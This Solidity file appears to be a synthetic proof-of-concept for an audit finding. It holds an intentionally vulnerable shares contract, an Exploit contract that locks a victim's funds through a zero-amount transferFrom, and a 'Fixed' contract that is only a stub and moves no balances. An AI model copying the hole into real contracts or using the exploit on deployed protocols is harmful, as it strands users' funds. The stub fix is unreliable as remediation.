// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Teller — LenderCommitmentGroupShares resets a prepared burn on every
    transfer, including amount 0 (Sherlock #24, finding 44213).
    SYNTHETIC, cheatcode-free. OpenZeppelin ERC-20 4.8 transferFrom accepts a
    0 amount with a 0 allowance and still calls _afterTokenTransfer. The hook
    clears poolSharesPreparedToWithdrawForLender and stamps the timestamp, so
    a withdrawal that was already past its delay reverts and the underlying
    stays in the group. @> VULN marks that reset.
    The victim's prepare is stored with timestamp 0, which is this block's
    stand-in for a prepare that already cleared withdrawDelay. */

contract ERC20 {
    string public name = "Group Underlying";
    string public symbol = "UND";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LenderCommitmentGroupShares {
    ERC20 public underlying;
    address public owner;
    uint256 public constant withdrawDelay = 1 days;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public poolSharesPreparedToWithdrawForLender;
    mapping(address => uint256) public poolSharesPreparedTimestamp;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor(ERC20 underlying_, address victim) {
        underlying = underlying_;
        owner = msg.sender;
        balanceOf[victim] = 100 ether;
        // Previous-block prepare whose delay has already elapsed.
        poolSharesPreparedToWithdrawForLender[victim] = 100 ether;
        poolSharesPreparedTimestamp[victim] = 0;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "ERC20: insufficient allowance");
            if (amount > 0) allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0) && to != address(0), "zero");
        if (amount > 0) {
            require(balanceOf[from] >= amount, "bal");
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
        _afterTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address, uint256) internal {
        poolSharesPreparedToWithdrawForLender[from] = 0;
        poolSharesPreparedTimestamp[from] = block.timestamp; // @> VULN: amount 0 still clears the prepared burn and restarts the delay
    }

    function burn(address burner, uint256 amount) external onlyOwner {
        require(poolSharesPreparedToWithdrawForLender[burner] >= amount, "Shares not prepared for withdraw");
        require(
            poolSharesPreparedTimestamp[burner] <= block.timestamp - withdrawDelay,
            "Shares not prepared for withdraw"
        );
        poolSharesPreparedToWithdrawForLender[burner] = 0;
        poolSharesPreparedTimestamp[burner] = block.timestamp;
        balanceOf[burner] -= amount;
        underlying.transfer(burner, amount);
    }
}

contract LenderCommitmentGroupSharesFixed {
    ERC20 public underlying;
    address public owner;
    uint256 public constant withdrawDelay = 1 days;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public poolSharesPreparedToWithdrawForLender;
    mapping(address => uint256) public poolSharesPreparedTimestamp;

    constructor(ERC20 underlying_, address victim) {
        underlying = underlying_;
        owner = msg.sender;
        balanceOf[victim] = 100 ether;
        poolSharesPreparedToWithdrawForLender[victim] = 100 ether;
        poolSharesPreparedTimestamp[victim] = 0;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(amount > 0, "zero amount");
        require(from != address(0) && to != address(0), "zero");
        _afterSkipped(from, amount);
        return true;
    }

    function _afterSkipped(address from, uint256 amount) internal pure {
        from;
        amount;
    }

    function burn(address burner, uint256 amount) external {
        require(msg.sender == owner, "owner");
        require(poolSharesPreparedToWithdrawForLender[burner] >= amount, "Shares not prepared for withdraw");
        require(block.timestamp >= poolSharesPreparedTimestamp[burner] + withdrawDelay, "delay");
        poolSharesPreparedToWithdrawForLender[burner] = 0;
        balanceOf[burner] -= amount;
        underlying.transfer(burner, amount);
    }
}

contract Exploit {
    ERC20 public underlying; // nonce 1
    LenderCommitmentGroupShares public shares; // nonce 2
    address public constant victim = address(0xBEEF);

    constructor() {
        underlying = new ERC20();
        shares = new LenderCommitmentGroupShares(underlying, victim);
        underlying.mint(address(shares), 100 ether);
    }

    function run() external {
        uint256 prepared = shares.poolSharesPreparedToWithdrawForLender(victim);
        require(prepared == 100 ether, "victim prepared a full burn");
        require(shares.poolSharesPreparedTimestamp(victim) == 0, "delay already elapsed");
        require(shares.allowance(victim, address(this)) == 0, "no approval");
        bool moved = shares.transferFrom(victim, victim, 0);
        require(moved, "zero transferFrom succeeded");
        require(shares.poolSharesPreparedToWithdrawForLender(victim) == 0, "prepared amount cleared");
        require(shares.balanceOf(victim) == 100 ether, "shares did not move");
        bool burned = true;
        try shares.burn(victim, 100 ether) {
            burned = true;
        } catch {
            burned = false;
        }
        require(!burned, "burn reverted");
        require(underlying.balanceOf(address(shares)) == 100 ether, "underlying still locked");
        require(underlying.balanceOf(victim) == 0, "victim received nothing");
    }
}
